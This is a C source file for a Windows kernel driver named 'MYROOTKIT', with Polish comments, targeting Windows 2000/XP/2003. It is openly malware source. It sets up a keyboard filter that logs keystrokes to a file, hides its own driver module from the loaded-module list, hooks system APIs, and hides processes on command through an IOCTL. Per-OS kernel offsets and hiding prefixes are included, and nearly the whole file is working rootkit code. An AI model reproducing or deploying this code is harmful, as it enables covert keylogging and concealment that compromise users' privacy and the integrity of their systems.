// MYROOTKIT DEVICE DRIVER

#include <ntddk.h>

#include "rootkit.h"
#include "rk_Tools.h"
#include "rk_keyboard.h"
#include "rk_DKOM.h"
#include "rk_Hook.h"
#include "IoControl.h"

typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE 
{ 
 UNICODE_STRING ModuleName; 
} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE; 

#define SystemLoadAndCallImage	38 

// We are going to set this to point to PsLoadedModuleList.
PMODULE_ENTRY	gul_PsLoadedModuleList;  

PDEVICE_OBJECT	gp_DeviceObject = NULL;
PDEVICE_OBJECT  gp_KeyboardDevice = NULL;
ULONG			gp_NumPendingIrps = 0;
ULONG			gp_ProcNameOffset = 0;
PMODULE_ENTRY	gp_HiddenDriver = NULL;

//active config
ROOTKIT_SETUP_DATA	offsets = {0};

//WCHAR hidePrefixW[] = L"myRootkit";
//CHAR hidePrefixA[] =  "myRootkit";
//CHAR masterPrefix[] = "bill";	

UNICODE_STRING hidePrefixW;
char *hidePrefixA;
char *masterPrefix;


//availble configs
//ROOTKIT_SETUP_DATA WIN2KSETUP		= { 0x0, 0x9C, 0xA0, 0x128, 0x8 , 0x54, 0x10, 0xA0 };
//ROOTKIT_SETUP_DATA WINXPSETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0 };
//ROOTKIT_SETUP_DATA WINXPSP2SETUP	= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0 };
//ROOTKIT_SETUP_DATA WIN2K3SETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0 };

ROOTKIT_SETUP_DATA WIN2KSETUP		= { 0x0, 0x9C, 0xA0, 0x128, 0x8 , 0x54, 0x10, 0xA0, 0x0c };
ROOTKIT_SETUP_DATA WINXPSETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0, 0x04 };
ROOTKIT_SETUP_DATA WINXPSP2SETUP	= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0, 0x04 };
ROOTKIT_SETUP_DATA WIN2K3SETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0, 0x04 };

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (PAGE, DispatchGeneral)
#pragma alloc_text (PAGE, KeyboardAddDevice)
#pragma alloc_text (PAGE, KeyboardUnload)
#pragma alloc_text (PAGE, KeyboardPnP)
#pragma alloc_text (PAGE, KeyboardPower)
#endif // ALLOC_PRAGMA

//Import NtBuildNumber from ntoskrnl.exe
__declspec(dllimport) ULONG NtBuildNumber;

NTSTATUS Driver_Create( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	DbgPrint("Driver_Create\n");

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp, IO_NO_INCREMENT );
	return status;
}

NTSTATUS Driver_Close( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	DbgPrint("Driver_Close DeviceObject: %x\n",DeviceObject);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp, IO_NO_INCREMENT );	
	return status;
}

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	PROOTKIT_EXT devExt;
	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	UNICODE_STRING symbolicLink;

	DbgPrint("myRootkit: OnUnload called: %x \n",DriverObject);
	devExt = (PROOTKIT_EXT)DriverObject->DeviceObject->DeviceExtension; 
	
	UnHookApis();

	//Detach from the device underneath that we're hooked to
	IoDetachDevice(devExt->PrevDevice);

	DbgPrint("Keyboard device detached");

	//Create a timer
	timeout.QuadPart = 1000000; //.1 s
	KeInitializeTimer(&kTimer);

	DbgPrint("Pending IRPs: %d\n",gp_NumPendingIrps);
	
	while(gp_NumPendingIrps > 0)
	{
		//Set the timer
		KeSetTimer(&kTimer,timeout,NULL);
		KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);
	}
		
	devExt->bThreadRunning = FALSE; //we are stoping working thread

	KeReleaseSemaphore(&devExt->semaphore, 0, 1, TRUE);

	DbgPrint("Waiting for key logger thread to terminate...\n");
	KeWaitForSingleObject(devExt->pThread, Executive, KernelMode, TRUE, NULL);
	DbgPrint("Key logger thread termintated\n");

	//Close the log file
	ZwClose( devExt->hLogFile );

	//shut down NDIS
	//ShutDownNdis();

	//Delete symbolic link
	RtlInitUnicodeString( &symbolicLink, ROOTKIT_DRIVER_WIN32_DEV_NAME );
	IoDeleteSymbolicLink( &symbolicLink );

	IoDeleteDevice(gp_KeyboardDevice);
	IoDeleteDevice(gp_DeviceObject);

	//Delete the device
//	IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("OnUnload leaved\n");

	ExFreePool( hidePrefixA );
	ExFreePool( masterPrefix);
}

NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION irpStack; 
	ULONG inputSize;
	ULONG controlCode;
	PVOID pInputBuffer;

	if ( DeviceObject == gp_KeyboardDevice ) {
		//tutaj przekazujemy Irp dla nastepnego w lanuchu drivera
		return CompleteKeyboard(Irp);
	}

	//now we only service OUR driver IOCTLS

	irpStack = IoGetCurrentIrpStackLocation( Irp );
	controlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
	inputSize = irpStack->Parameters.DeviceIoControl.InputBufferLength;
	pInputBuffer = Irp->AssociatedIrp.SystemBuffer;

	switch (controlCode) 
	{
	case IOCTL_LOGIN:
		DbgPrint("Login\n");
		break;

	case IOCTL_LOGOUT:
		DbgPrint("Logout\n");
		break;

	case IOCTL_HIDE_PROCESS:
		DbgPrint("Before IOCTL_HIDE_PROCESS\n");
		if (inputSize == sizeof(ULONG)) {
			DbgPrint("Lets hide something...");
			OnProcessHide( *(ULONG*)pInputBuffer );
		}
		break;

	default:
		break;
	}	

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp , IO_NO_INCREMENT );
	return status;
}

//----------------------------------------------------------------------------------------
//	DriverEntry
//----------------------------------------------------------------------------------------
//
//
//----------------------------------------------------------------------------------------
NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegistryPath )
{	
	NTSTATUS		status = STATUS_SUCCESS;
	UNICODE_STRING	deviceName;
	UNICODE_STRING	symbolicName;
	ULONG i;
	ULONG m,j,k;
	ULONG procNotifyCount;

	DbgPrint("Entered DriverEntry: %x",driverObject);

	driverObject->DriverUnload  = OnUnload;

	//wypelniamy tablice
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
        driverObject->MajorFunction[i] =DispatchGeneral;
    }

	//do obslugi klawiatury
	driverObject->MajorFunction[IRP_MJ_READ				] =	KeyBoardDispatchRead;
//	driverObject->MajorFunction[IRP_MJ_POWER			] =	KeyboardPower;
    //zeby wiedziec kiedy urzadzenie klawiatury jest odlaczone
//	driverObject->MajorFunction[IRP_MJ_PNP				] = KeyboardPnP;

//	driverObject->DriverUnload = KeyboardUnload;
	//dla informacji o podpinaniu nowej klawiatury
    //driverObject->DriverExtension->AddDevice = KeyboardAddDevice;

	//
	driverObject->MajorFunction[ IRP_MJ_CREATE			] = Driver_Create;
	driverObject->MajorFunction[ IRP_MJ_CLOSE			] = Driver_Close;
	driverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL	] = Driver_IoControl; 

	//unicode names initialization
	RtlInitUnicodeString( &deviceName, ROOTKIT_DRIVER_DEV_NAME );
	RtlInitUnicodeString( &symbolicName, ROOTKIT_DRIVER_WIN32_DEV_NAME );

	//we are creating communication object that GUI can use to send requsts to driver
	status = IoCreateDevice( driverObject, sizeof( ROOTKIT_EXT ),
								&deviceName,
								FILE_DEVICE_UNKNOWN,			
								0,
								TRUE,							//we allow for only one client
								&driverObject->DeviceObject);

	if (status == STATUS_OBJECT_NAME_EXISTS)
		DbgPrint("STATUS_OBJECT_NAME_EXISTS\n");
	if (status == STATUS_OBJECT_NAME_COLLISION)
		DbgPrint("STATUS_OBJECT_NAME_COLLISION\n");

	if (status!=STATUS_SUCCESS) {
		DbgPrint("myRootkit: IoCreateDeviceFailed\n");
		return status;
	}

	status = IoCreateSymbolicLink( &symbolicName, &deviceName );
	if (status!=STATUS_SUCCESS) {
		DbgPrint("IoCreateSymbolicLink failed\n");
		return status;
	}

	hidePrefixA = ExAllocatePool( NonPagedPool, 20);
	if (hidePrefixA == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	strcpy( hidePrefixA , "myRootkit");
	DbgPrint( "hidePrefixA %s\n",hidePrefixA);

	masterPrefix = ExAllocatePool( NonPagedPool, 10);
	if (masterPrefix == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	strcpy( masterPrefix , "bill");
	DbgPrint( "masterPrefix %s\n",masterPrefix);

	RtlInitUnicodeString( &hidePrefixW, L"myRootkit");	

	gp_DeviceObject = driverObject->DeviceObject;

    //tutaj tworzymy urzadzenie dla klawiatury oraz inicjujemy

	//starts up keyboard sniffer code...
	KeyboardInit( driverObject, &gp_KeyboardDevice);
	SetupKeylogger( gp_KeyboardDevice );	

	//setup specific system characterisitc
	gp_ProcNameOffset  = GetProcessNameOffset();

	if ( SetupOffsets( gp_ProcNameOffset ) == FALSE ) {
		DbgPrint("OS Unsupported! Quiting");
		return STATUS_UNSUCCESSFUL;
	}

//	procNotifyCount = PspCreateProcessNotifyRoutineCount;
//	DbgPrint("PspCreateProcessNotifyRoutineCount: %d",procNotifyCount);

//	HookNtDeviceIoControl();

	gul_PsLoadedModuleList =  (PMODULE_ENTRY)FindPsLoadedModuleList(driverObject);

//	gp_HiddenDriver = PatchNtoskrnlImageSize( gul_PsLoadedModuleList );

	HideModule();

	//starts up packet sniffer code...
//	SetupNdis();

	SetupIndexes();
	HookApis();

	DbgPrint("DriverEntry leaved");
	return status;
}

NTSTATUS AbandonRequest(PIRP Irp)
{
	DbgPrint("AbandonRequest\n");
	Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_ACCESS_DENIED;
}

NTSTATUS CompleteRequest(PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	//Irp->IoStatus.Status is gone!!! after we call IoCompleteRequest
	return STATUS_SUCCESS;
}

NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
{
	if (DeviceObject == gp_DeviceObject) {
		//dla wlasnego drivera konczymy przetwarzanie IRP
		DbgPrint("Dispach general: DeviceObject: %x \n",DeviceObject);
		return CompleteRequest(Irp);
	}

	// ten IRP jest dla klawiatury

    //
    // Przepuszczamy IRP do nastepnego drivera w lancuch bez modyfikowania
    //
	else
	if (DeviceObject == gp_KeyboardDevice) {
		DbgPrint("Dispach general: KeyboardDeviceObject: %x \n",DeviceObject);
		return CompleteKeyboard( Irp );
	}
	else
		DbgPrint("Dispach general else: DeviceObject: %x \n",DeviceObject);

	// to sie nie powinno wywolywac NIGDY !
	DbgPrint(" O so choci ??? :/\n");
    IoSkipCurrentIrpStackLocation(Irp);
    return IoCallDriver(((PROOTKIT_EXT) DeviceObject->DeviceExtension)->PrevDevice, Irp);
}

NTSTATUS CompleteKeyboard(IN PIRP Irp)
{
	IoSkipCurrentIrpStackLocation(Irp);
	return IoCallDriver(((PROOTKIT_EXT)gp_KeyboardDevice)->PrevDevice, Irp);
}

BOOLEAN SetupOffsets(ULONG nameOffset)
{
	ULONG BuildNumber = (NtBuildNumber & 0x0000FFFF);

	switch (BuildNumber)
	{
	case 2195:
		offsets = WIN2KSETUP;
		break;

	case 2600:
		DbgPrint("WinXPSP1 recongnized");
		offsets = WINXPSETUP;
		break;

	case 3790:		
		DbgPrint("Win2k3 recongnized");
		offsets = WIN2K3SETUP;
		break;
	//... other OSes

	default:
		return FALSE;
		break;
	}

	//sets name offset
	offsets.nameOffset = nameOffset;

	return TRUE;
}
